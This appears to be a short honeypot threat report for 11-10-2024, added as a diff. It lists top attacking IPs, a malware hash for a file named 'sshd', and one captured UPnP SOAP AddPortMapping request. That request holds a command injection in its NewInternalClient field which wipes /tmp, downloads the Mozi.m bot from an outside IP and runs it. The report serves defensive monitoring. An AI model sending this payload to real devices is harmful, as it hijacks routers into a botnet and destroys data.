@@ -1,0 +1,28 @@
+Top 5 IPs for 11-10-2024 :
+
+103.138.173.20
+94.159.98.63
+218.158.251.242
+167.71.27.177
+101.126.64.251
+
+Malware Observed:
+
+File name : sshd
+e948036f1c3b3024a6864fa1c49332c80e1fd28484cf487233a50154ffe104f8
+https://www.virustotal.com/gui/file/e948036f1c3b3024a6864fa1c49332c80e1fd28484cf487233a50154ffe104f8
+ 
+
+Commands/exploits observed :
+
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: <host IP>
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://117.235.96.234:44194/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
